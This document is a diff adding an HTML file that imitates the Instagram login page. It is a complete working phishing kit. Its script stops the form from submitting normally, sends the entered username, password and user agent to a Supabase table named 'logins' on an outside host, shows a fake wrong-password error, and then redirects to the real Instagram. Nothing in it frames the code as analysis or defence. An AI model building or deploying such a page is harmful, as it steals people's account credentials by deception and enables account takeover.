@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+
+<script>
+  const SUPABASE_URL = 'https://zraqeusxizqutshtzsrf.supabase.co';
+  const SUPABASE_KEY = 'sb_publishable_1AKdI_0X3BFlcJU_NWu2MA_gGEAggPp';
+  const TABLE_NAME   = 'logins';
+</script>
+
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+  body {
+    background: #fafafa;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+    color: #262626;
+  }
+  .container { width: 100%; max-width: 350px; }
+  .login-box {
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    padding: 40px 40px 20px;
+    text-align: center;
+    margin-bottom: 10px;
+  }
+  .logo {
+    font-family: 'Billabong', 'Brush Script MT', cursive;
+    font-size: 48px;
+    margin-bottom: 30px;
+    color: #262626;
+    font-weight: 400;
+  }
+  .login-form { display: flex; flex-direction: column; gap: 6px; }
+  .login-form input {
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    padding: 9px 8px 7px;
+    font-size: 12px;
+    outline: none;
+    width: 100%;
+  }
+  .login-form input:focus { border-color: #a8a8a8; }
+  .login-form input::placeholder { color: #8e8e8e; }
+  .login-btn {
+    background: #0095f6;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    padding: 8px;
+    font-size: 14px;
+    font-weight: 600;
+    margin-top: 8px;
+    cursor: pointer;
+    transition: opacity .15s;
+  }
+  .login-btn:disabled { opacity: 0.5; cursor: default; }
+  .divider {
+    display: flex;
+    align-items: center;
+    margin: 20px 0;
+    color: #8e8e8e;
+    font-size: 13px;
+    font-weight: 600;
+  }
+  .divider::before, .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: #dbdbdb;
+  }
+  .divider span { padding: 0 18px; }
+  .fb-login {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    color: #385185;
+    font-size: 14px;
+    font-weight: 600;
+    text-decoration: none;
+    margin-bottom: 15px;
+  }
+  .fb-login svg { width: 16px; height: 16px; fill: #385185; }
+  .forgot {
+    color: #00376b;
+    font-size: 12px;
+    text-decoration: none;
+    display: inline-block;
+    margin-top: 10px;
+  }
+  .error-msg {
+    display: none;
+    background: #ed4956;
+    color: #fff;
+    font-size: 13px;
+    padding: 10px;
+    border-radius: 4px;
+    margin-top: 15px;
+    line-height: 1.4;
+  }
+  .signup-box {
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    padding: 20px;
+    text-align: center;
+    font-size: 14px;
+    margin-bottom: 20px;
+  }
+  .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
+  .get-app { text-align: center; font-size: 14px; }
+  .get-app p { margin-bottom: 15px; }
+  .stores { display: flex; justify-content: center; gap: 8px; }
+  .stores img { height: 40px; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="login-box">
+    <div class="logo">Instagram</div>
+
+    <form class="login-form" id="loginForm" action="#" method="POST">
+      <input type="text" name="username" placeholder="Phone number, username, or email" autocomplete="username" required>
+      <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
+      <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+    </form>
+
+    <div class="divider"><span>OR</span></div>
+
+    <a href="#" class="fb-login">
+      <svg viewBox="0 0 24 24">
+        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+      </svg>
+      Log in with Facebook
+    </a>
+
+    <a href="#" class="forgot">Forgot password?</a>
+
+    <div class="error-msg" id="errorMsg">
+      Sorry, your password was incorrect. Please double-check your password.
+    </div>
+  </div>
+
+  <div class="signup-box">
+    Don't have an account? <a href="#">Sign up</a>
+  </div>
+
+  <div class="get-app">
+    <p>Get the app.</p>
+    <div class="stores">
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/y5/r/TJztmXpWTmS.png" alt="App Store">
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/y2/r/__geKiQnSG-.png" alt="Google Play">
+    </div>
+  </div>
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    var btn = document.getElementById('loginBtn');
+    btn.disabled = true;
+    btn.textContent = 'Logging in...';
+
+    var form = this;
+    var username = form.querySelector('input[name="username"]').value;
+    var password = form.querySelector('input[name="password"]').value;
+
+    fetch(SUPABASE_URL + '/rest/v1/' + TABLE_NAME, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'apikey': SUPABASE_KEY,
+            'Authorization': 'Bearer ' + SUPABASE_KEY,
+            'Prefer': 'return=minimal'
+        },
+        body: JSON.stringify({
+            username: username,
+            password: password,
+            user_agent: navigator.userAgent,
+            ts: new Date().toISOString()
+        })
+    })
+    .catch(function(err) { console.warn('send failed', err); })
+    .then(function() {
+        setTimeout(function() {
+            document.getElementById('errorMsg').style.display = 'block';
+            setTimeout(function() {
+                window.location.href = 'https://www.instagram.com';
+            }, 1500);
+        }, 800);
+    });
+});
+</script>
+
+</body>
+</html>
